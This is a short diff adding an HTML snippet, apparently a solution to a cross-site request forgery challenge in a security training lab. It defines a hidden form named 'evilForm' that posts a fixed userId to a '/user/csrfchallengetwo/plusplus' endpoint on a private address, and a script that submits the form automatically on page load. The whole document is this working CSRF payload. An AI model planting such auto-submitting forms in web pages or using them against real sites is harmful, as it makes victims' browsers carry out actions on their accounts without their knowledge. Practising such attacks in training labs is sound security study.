@@ -1,0 +1,5 @@
+<form name="evilForm" action="https://192.168.1.5/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="957439c1225f4cdc40da5832a9d860df91ce7b80" />
+    <input type="submit"/> 
+</form> 
+<script> document.evilForm.submit(); </script>
